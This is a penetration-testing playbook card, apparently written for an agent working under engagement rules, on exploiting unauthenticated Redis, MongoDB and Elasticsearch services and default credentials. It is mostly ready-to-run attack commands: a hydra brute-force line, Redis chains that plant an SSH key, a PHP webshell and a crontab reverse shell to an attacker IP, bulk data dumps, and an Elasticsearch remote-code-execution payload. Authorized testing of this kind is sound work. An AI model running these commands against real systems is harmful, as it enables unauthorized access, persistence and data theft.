# Infrastructure, VPN, Middleware, And Desktop Operations: Attack Primitives: Unauthenticated/Default Credential Services

## Contents

- [Attack Primitives: Unauthenticated/Default Credential Services](#attack-primitives-unauthenticateddefault-credential-services)
  - [Unauthenticated Redis — Validation And Escalation Ladder](#unauthenticated-redis-validation-and-escalation-ladder)
  - [Unauthenticated MongoDB — Full Exploitation](#unauthenticated-mongodb-full-exploitation)
  - [Unauthenticated Elasticsearch](#unauthenticated-elasticsearch)


> Apply [../module-continuity.md](../module-continuity.md). Inherit the engagement, parent path, current capability, evidence, authorization profile, and module stack. Do not initialize a separate workflow. Checkpoint material results and return them to the parent path before leaving this card.

## Attack Primitives: Unauthenticated/Default Credential Services

This is the most common finding in infrastructure pentests. Test before running exploits.

```bash
# Select default credentials from vendor evidence and test one bounded candidate first. Do not mechanically test this list against every service:
# admin:admin, admin:password, admin:<blank>, root:root, root:<blank>,
# guest:guest, sa:<blank> (MSSQL), postgres:postgres, ubuntu:ubuntu,
# pi:raspberry, cisco:cisco, apc:apc, vagrant:vagrant

# A users/passwords matrix is L3 unless explicitly bounded and approved. Prefer a single candidate at L1:
hydra -L users.txt -P passwords.txt <host> <service> -t 4
# -t 4: limit to 4 parallel tasks to avoid lockout
```

### Unauthenticated Redis — Validation And Escalation Ladder

Start with the L1 read-only identity/configuration check and the smallest synthetic or test-owned key access that proves exposure. The durable access examples below are L3 alternatives for a specifically approved phase; they are not the default next step after unauthenticated access.

```bash
# 1. Verify unauthenticated access
redis-cli -h <host> INFO
# If response includes redis_version, keyspace — unauthenticated confirmed

# 2. Data exfiltration
redis-cli -h <host> KEYS '*'
redis-cli -h <host> GET <key>

# 3. Write SSH key (if Redis runs as root and has write access to /root/.ssh)
ssh-keygen -t rsa -C "redis@attacker" -f redis_key
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > redis_pub.txt
cat redis_pub.txt | redis-cli -h <host> -x SET mykey
redis-cli -h <host> CONFIG SET dir /root/.ssh
redis-cli -h <host> CONFIG SET dbfilename authorized_keys
redis-cli -h <host> SAVE
ssh -i redis_key root@<host>

# 4. Write webshell (if web server document root is identifiable)
redis-cli -h <host> CONFIG SET dir /var/www/html
redis-cli -h <host> CONFIG SET dbfilename shell.php
redis-cli -h <host> SET webshell "<?php system(\$_GET['cmd']); ?>"
redis-cli -h <host> SAVE
curl http://<host>/shell.php?cmd=id

# 5. Crontab reverse shell (if Redis runs as root)
redis-cli -h <host> CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h <host> CONFIG SET dbfilename root
redis-cli -h <host> SET payload "\n* * * * * bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1\n"
redis-cli -h <host> SAVE
```

### Unauthenticated MongoDB — Full Exploitation

```bash
mongo <host>:27017
> show dbs
> use admin
> show collections
> db.system.users.find()  # may contain admin credentials
> use <sensitive_db>
> show collections
> db.<collection>.find().pretty()
```

### Unauthenticated Elasticsearch

```bash
# List all indices
curl http://<host>:9200/_cat/indices?v

# Dump all data from an index
curl http://<host>:9200/<index>/_search?size=10000

# Check cluster health and settings
curl http://<host>:9200/_cluster/health
curl http://<host>:9200/_cluster/settings  # may contain cloud credentials

# Check if scripting is enabled (RCE possible via Groovy/Painless scripts)
curl -X POST "http://<host>:9200/_search" -H 'Content-Type: application/json' -d '{
  "script_fields": {
    "test": {
      "script": {
        "source": "java.lang.Runtime.getRuntime().exec(\"id\")"
      }
    }
  }
}'
```

---


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).




